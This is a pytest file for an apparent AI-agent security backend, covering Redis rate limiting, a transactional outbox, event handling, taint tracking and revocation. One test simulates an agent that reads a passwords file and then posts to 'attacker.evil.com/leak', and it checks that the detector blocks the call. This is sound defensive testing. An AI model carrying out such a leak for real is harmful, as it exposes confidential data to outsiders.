"""Unit and Integration Tests for Stage 10.3: Distributed State Management, Redis, and Outbox.
Moon Sanctum Labs - Decode. Build. Evolve.
"""

import json
import time
import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, text
from fastapi.testclient import TestClient

from app.main import app
from app.database.models import (
    OutboxEvent,
    ActiveTaint,
    Agent,
    CapabilityGrant,
    FleetResource,
    PolicyBundle,
    utcnow,
)
from app.database.connection import get_pool_status
from app.infrastructure.rate_limiter import (
    DistributedRateLimiter,
    RateLimitPolicy,
    DEFAULT_POLICIES,
)
from app.infrastructure.outbox import emit_outbox_event, OutboxPublisher
from app.infrastructure.event_bus import RedisEventBus
from app.infrastructure.taint_store import DistributedTaintStore
from app.threat_detection.exfiltration_detector import ExfiltrationDetector
from app.privacy.secret_scanner import SecretScanner
from app.enterprise.fleet import FleetManager
from app.agent_security.capability_manager import CapabilityManager
from app.policies.governance import PolicyGovernanceManager


@pytest.mark.asyncio
async def test_01_redis_sliding_window_rate_limiter_local_fallback():
    """Verify local sliding window fallback rate limiter enforces limits when Redis is offline."""
    limiter = DistributedRateLimiter(custom_redis=None)
    policy = RateLimitPolicy(max_requests=3, window_seconds=60)

    # 1. First 3 requests should be allowed
    r1 = await limiter.check_rate_limit("test_tenant", "AUTHENTICATION", "user_1", custom_policy=policy)
    assert r1.allowed is True
    assert r1.remaining == 2
    assert r1.backend_mode == "in_memory_fallback"

    r2 = await limiter.check_rate_limit("test_tenant", "AUTHENTICATION", "user_1", custom_policy=policy)
    assert r2.allowed is True
    assert r2.remaining == 1

    r3 = await limiter.check_rate_limit("test_tenant", "AUTHENTICATION", "user_1", custom_policy=policy)
    assert r3.allowed is True
    assert r3.remaining == 0

    # 2. 4th request must be rejected with retry_after > 0
    r4 = await limiter.check_rate_limit("test_tenant", "AUTHENTICATION", "user_1", custom_policy=policy)
    assert r4.allowed is False
    assert r4.remaining == 0
    assert r4.retry_after > 0

    # 3. Different user in same tenant should have independent quota
    r_user2 = await limiter.check_rate_limit("test_tenant", "AUTHENTICATION", "user_2", custom_policy=policy)
    assert r_user2.allowed is True


@pytest.mark.asyncio
async def test_02_redis_sliding_window_rate_limiter_lua():
    """Test DistributedRateLimiter invoking Redis eval Lua script."""
    mock_redis = AsyncMock()
    # Mock return from Lua: [allowed (1/0), remaining, retry_after]
    mock_redis.eval = AsyncMock(return_value=[1, 4, 0])

    limiter = DistributedRateLimiter(custom_redis=mock_redis)
    policy = RateLimitPolicy(max_requests=5, window_seconds=60)

    res = await limiter.check_rate_limit("tenant_alpha", "GATEWAY", "client_ip_1", custom_policy=policy)
    assert res.allowed is True
    assert res.remaining == 4
    assert res.backend_mode == "redis"
    assert mock_redis.eval.called

    # Test rejection from Lua script
    mock_redis.eval = AsyncMock(return_value=[0, 0, 15])
    res_blocked = await limiter.check_rate_limit("tenant_alpha", "GATEWAY", "client_ip_1", custom_policy=policy)
    assert res_blocked.allowed is False
    assert res_blocked.retry_after == 15


@pytest.mark.asyncio
async def test_03_transactional_outbox_rollback_atomicity(db_session: AsyncSession):
    """Verify that when a transaction is rolled back, the OutboxEvent is discarded."""
    emit_outbox_event(
        session=db_session,
        event_type="TEST_EVENT_ROLLBACK",
        aggregate_id="agg_rollback_1",
        payload={"message": "should not persist"},
        tenant_id="tenant_rollback",
    )
    await db_session.rollback()

    res = await db_session.execute(
        select(OutboxEvent).where(OutboxEvent.aggregate_id == "agg_rollback_1")
    )
    assert res.scalar_one_or_none() is None


@pytest.mark.asyncio
async def test_04_transactional_outbox_commit_persistence(db_session: AsyncSession):
    """Verify that when a transaction commits, the OutboxEvent is durably stored."""
    event = emit_outbox_event(
        session=db_session,
        event_type="TEST_EVENT_COMMIT",
        aggregate_id="agg_commit_1",
        payload={"action": "created", "value": 42},
        tenant_id="tenant_commit",
    )
    await db_session.commit()

    res = await db_session.execute(
        select(OutboxEvent).where(OutboxEvent.aggregate_id == "agg_commit_1")
    )
    persisted = res.scalar_one_or_none()
    assert persisted is not None
    assert persisted.event_type == "TEST_EVENT_COMMIT"
    assert persisted.status == "PENDING"
    assert persisted.retry_count == 0
    payload_data = json.loads(persisted.payload)
    assert payload_data["value"] == 42


@pytest.mark.asyncio
async def test_05_outbox_publisher_batching(db_session: AsyncSession):
    """Verify OutboxPublisher polls pending events, writes to Redis Streams, and marks PUBLISHED."""
    mock_redis = AsyncMock()
    mock_redis.xadd = AsyncMock(return_value="1700000000000-0")
    mock_redis.publish = AsyncMock(return_value=1)

    # Insert pending outbox events
    emit_outbox_event(
        session=db_session,
        event_type="AGENT_REVOKED",
        aggregate_id="agent_pub_1",
        payload={"reason": "Compromised credential"},
        tenant_id="tenant_pub",
    )
    emit_outbox_event(
        session=db_session,
        event_type="POLICY_ACTIVATED",
        aggregate_id="policy_pub_1",
        payload={"version": 2},
        tenant_id="tenant_pub",
    )
    await db_session.commit()

    publisher = OutboxPublisher(custom_redis=mock_redis)
    published_count = await publisher.publish_pending_events(db_session, batch_size=10)
    assert published_count >= 2
    assert mock_redis.xadd.call_count >= 2
    assert mock_redis.publish.call_count >= 2

    # Check that events in DB are now PUBLISHED
    res = await db_session.execute(
        select(OutboxEvent).where(
            OutboxEvent.aggregate_id.in_(["agent_pub_1", "policy_pub_1"])
        )
    )
    events = res.scalars().all()
    for ev in events:
        assert ev.status == "PUBLISHED"
        assert ev.published_at is not None


@pytest.mark.asyncio
async def test_06_event_bus_consumer_group_idempotency():
    """Verify RedisEventBus handles messages, invokes registered handlers, and acknowledges."""
    mock_redis = AsyncMock()
    bus = RedisEventBus(custom_redis=mock_redis)

    handled_events = []

    async def sample_handler(event_data: dict) -> None:
        handled_events.append(event_data)

    bus.subscribe("AGENT_REVOKED", sample_handler)

    # Simulate message from Redis stream: [(stream_key, [(msg_id, data_dict)])]
    stream_message = (
        "stream:events:tenant_1",
        [
            (
                "1700000000001-0",
                {
                    "event_id": "ev_123",
                    "event_type": "AGENT_REVOKED",
                    "aggregate_id": "agent_x",
                    "payload": json.dumps({"reason": "test"}),
                },
            )
        ],
    )
    mock_redis.xreadgroup = AsyncMock(return_value=[stream_message])
    mock_redis.xack = AsyncMock(return_value=1)

    processed = await bus.read_and_dispatch("stream:events:tenant_1", count=1)
    assert processed == 1
    assert len(handled_events) == 1
    assert handled_events[0]["aggregate_id"] == "agent_x"
    assert mock_redis.xack.called

    # Re-reading same message id should be skipped due to deduplication cache
    processed_duplicate = await bus.read_and_dispatch("stream:events:tenant_1", count=1)
    assert processed_duplicate == 0
    assert len(handled_events) == 1  # Not processed again


@pytest.mark.asyncio
async def test_07_distributed_taint_store_postgres_and_cache(db_session: AsyncSession):
    """Test DistributedTaintStore adds taint to PostgreSQL and Redis, and retrieves it."""
    mock_redis = AsyncMock()
    mock_redis.scard = AsyncMock(return_value=1)
    mock_redis.smembers = AsyncMock(return_value={"customer_pii.csv"})

    taint_store = DistributedTaintStore(custom_redis=mock_redis)

    await taint_store.add_taint(
        db=db_session,
        task_id="task_taint_1",
        resource="customer_pii.csv",
        tenant_id="tenant_taint",
        classification="CONFIDENTIAL",
    )

    # Monotonic check should confirm task is tainted
    is_tainted = await taint_store.is_task_tainted(db_session, "task_taint_1", "tenant_taint")
    assert is_tainted is True

    # Check PostgreSQL record was written
    res = await db_session.execute(
        select(ActiveTaint).where(ActiveTaint.task_id == "task_taint_1")
    )
    taint_row = res.scalar_one_or_none()
    assert taint_row is not None
    assert taint_row.resource == "customer_pii.csv"

    # Clear taints
    await taint_store.clear_task_taints(db_session, "task_taint_1", "tenant_taint")
    mock_redis.scard = AsyncMock(return_value=0)
    mock_redis.smembers = AsyncMock(return_value=set())

    res_after = await db_session.execute(
        select(ActiveTaint).where(ActiveTaint.task_id == "task_taint_1")
    )
    assert res_after.scalar_one_or_none() is None


@pytest.mark.asyncio
async def test_08_exfiltration_detector_distributed_taint(db_session: AsyncSession):
    """Verify ExfiltrationDetector integrates with DistributedTaintStore."""
    secret_scanner = SecretScanner()
    detector = ExfiltrationDetector(secret_scanner=secret_scanner)

    # Record sensitive access to customer_db
    recorded = await detector.record_access(
        db=db_session,
        task_id="task_exfil_dist",
        tool_name="read_file",
        resource="confidential_passwords.txt",
        tenant_id="tenant_exfil",
    )
    assert recorded is True
    assert detector.is_task_tainted("task_exfil_dist") is True

    # Cross-replica check via async method
    is_tainted_async = await detector.is_task_tainted_async(db_session, "task_exfil_dist", "tenant_exfil")
    assert is_tainted_async is True

    # Outbound call to untrusted destination should be blocked
    assessment = detector.evaluate_outbound_tool(
        task_id="task_exfil_dist",
        tool_name="post_webhook",
        params={"url": "https://attacker.evil.com/leak"},
    )
    assert assessment.is_threat is True
    assert assessment.action.value == "BLOCK"


@pytest.mark.asyncio
async def test_09_fleet_resource_revocation_outbox_event(db_session: AsyncSession):
    """Test FleetManager.revoke_resource authoritatively revokes agent and emits outbox event."""
    # 1. Register agent in fleet
    res = await FleetManager.register_resource(
        db=db_session,
        tenant_id="tenant_fleet_rev",
        resource_type="AGENT",
        resource_id="agent_to_revoke_1",
        name="Security Agent Alpha",
    )
    assert res.status == "ACTIVE"

    # 2. Revoke resource
    revoked = await FleetManager.revoke_resource(
        db=db_session,
        tenant_id="tenant_fleet_rev",
        resource_id="agent_to_revoke_1",
        reason="Security breach investigation",
    )
    assert revoked.status == "REVOKED"

    # 3. Verify OutboxEvent was generated in the same transaction
    outbox_q = select(OutboxEvent).where(
        OutboxEvent.tenant_id == "tenant_fleet_rev",
        OutboxEvent.aggregate_id == "agent_to_revoke_1",
    )
    outbox_res = await db_session.execute(outbox_q)
    event = outbox_res.scalar_one_or_none()
    assert event is not None
    assert event.event_type == "AGENT_REVOKED"
    payload = json.loads(event.payload)
    assert payload["reason"] == "Security breach investigation"


@pytest.mark.asyncio
async def test_10_capability_revocation_outbox_event(db_session: AsyncSession):
    """Test CapabilityManager.revoke_capability revokes grant and emits outbox event."""
    cap_mgr = CapabilityManager()

    grant, secret = await cap_mgr.issue_capability(
        db=db_session,
        agent_id="agent_cap_rev",
        task_id="task_cap_rev",
        app_id="app_cap_rev",
        tool_name="file_system_read",
    )
    assert grant.is_revoked is False

    revoked_grant = await cap_mgr.revoke_capability(
        db=db_session,
        capability_id=grant.id,
        app_id="app_cap_rev",
    )
    assert revoked_grant.is_revoked is True

    # Verify OutboxEvent
    outbox_q = select(OutboxEvent).where(
        OutboxEvent.aggregate_id == grant.id,
        OutboxEvent.event_type == "CAPABILITY_REVOKED",
    )
    outbox_res = await db_session.execute(outbox_q)
    event = outbox_res.scalar_one_or_none()
    assert event is not None
    payload = json.loads(event.payload)
    assert payload["tool_name"] == "file_system_read"


@pytest.mark.asyncio
async def test_11_policy_bundle_activation_and_rollback_outbox_events(db_session: AsyncSession):
    """Test PolicyGovernanceManager emits outbox events on policy deployment and rollback."""
    # 1. Create bundle
    bundle_1 = await PolicyGovernanceManager.create_policy_bundle(
        db=db_session,
        organization_id="org_gov_test",
        rules=[{"target": "read_data", "action": "ALLOW"}],
        created_by="admin_gov",
    )
    assert bundle_1.version == 1

    # 2. Deploy bundle
    deployed_1 = await PolicyGovernanceManager.deploy_policy_bundle(
        db=db_session,
        bundle_id=bundle_1.id,
        deployed_by="admin_gov",
    )
    assert deployed_1.status == "ACTIVE"

    # Verify POLICY_ACTIVATED outbox event
    outbox_q1 = select(OutboxEvent).where(
        OutboxEvent.aggregate_id == bundle_1.id,
        OutboxEvent.event_type == "POLICY_ACTIVATED",
    )
    res1 = await db_session.execute(outbox_q1)
    ev1 = res1.scalar_one_or_none()
    assert ev1 is not None

    # 3. Create and deploy bundle 2
    bundle_2 = await PolicyGovernanceManager.create_policy_bundle(
        db=db_session,
        organization_id="org_gov_test",
        rules=[{"target": "write_data", "action": "REQUIRE_APPROVAL"}],
        created_by="admin_gov",
    )
    await PolicyGovernanceManager.deploy_policy_bundle(
        db=db_session,
        bundle_id=bundle_2.id,
        deployed_by="admin_gov",
    )

    # 4. Rollback to bundle 1
    rolled_back = await PolicyGovernanceManager.rollback_policy(
        db=db_session,
        target_bundle_id=bundle_1.id,
        deployed_by="admin_gov",
    )
    assert rolled_back.status == "ACTIVE"

    # Verify POLICY_ROLLED_BACK outbox event
    outbox_q2 = select(OutboxEvent).where(
        OutboxEvent.aggregate_id == bundle_1.id,
        OutboxEvent.event_type == "POLICY_ROLLED_BACK",
    )
    res2 = await db_session.execute(outbox_q2)
    ev2 = res2.scalar_one_or_none()
    assert ev2 is not None


def test_12_database_pool_status_metrics():
    """Verify get_pool_status returns valid metadata dictionary."""
    status = get_pool_status()
    assert isinstance(status, dict)
    assert "pool_type" in status
    assert "is_postgres" in status


@pytest.mark.asyncio
async def test_13_system_probes_and_endpoints(db_session: AsyncSession):
    """Test operational endpoints /health/redis, /health/database, and /v1/system/ endpoints."""
    from app.database.models import Application
    from app.core.security import hash_api_key

    # Setup test app for authenticated /v1/system endpoints
    app_record = Application(
        id="app_sys_test",
        tenant_id="test_org",
        name="System Test App",
        api_key_hash=hash_api_key("pg_test_sys_key_123"),
        is_active=True,
    )
    db_session.add(app_record)
    await db_session.commit()

    headers = {"X-API-Key": "pg_test_sys_key_123", "X-Tenant-ID": "test_org"}
    client = TestClient(app)

    # 1. Health redis probe
    resp_redis = client.get("/health/redis")
    assert resp_redis.status_code in (200, 503)
    data_redis = resp_redis.json()
    assert "status" in data_redis

    # 2. Health database probe
    resp_db = client.get("/health/database")
    assert resp_db.status_code == 200
    data_db = resp_db.json()
    assert data_db["status"] == "healthy"
    assert "latency_ms" in data_db
    assert "pool" in data_db

    # 3. Rate limit statistics endpoint
    resp_rl = client.get("/v1/system/rate-limit-statistics", headers=headers)
    assert resp_rl.status_code == 200
    data_rl = resp_rl.json()
    assert data_rl["algorithm"] == "SLIDING_WINDOW_LUA"
    assert "enforcement_tiers" in data_rl
    assert "AUTHENTICATION" in data_rl["enforcement_tiers"]

    # 4. Distributed state endpoint
    resp_state = client.get("/v1/system/distributed-state", headers=headers)
    assert resp_state.status_code == 200
    data_state = resp_state.json()
    assert "cluster_mode" in data_state
    assert "outbox" in data_state
    assert "pending_events" in data_state["outbox"]

    # 5. Event processing status endpoint
    resp_ev = client.get("/v1/system/event-processing", headers=headers)
    assert resp_ev.status_code == 200
    data_ev = resp_ev.json()
    assert data_ev["event_bus"] == "REDIS_STREAMS"
    assert "tenant_pending_outbox_events" in data_ev
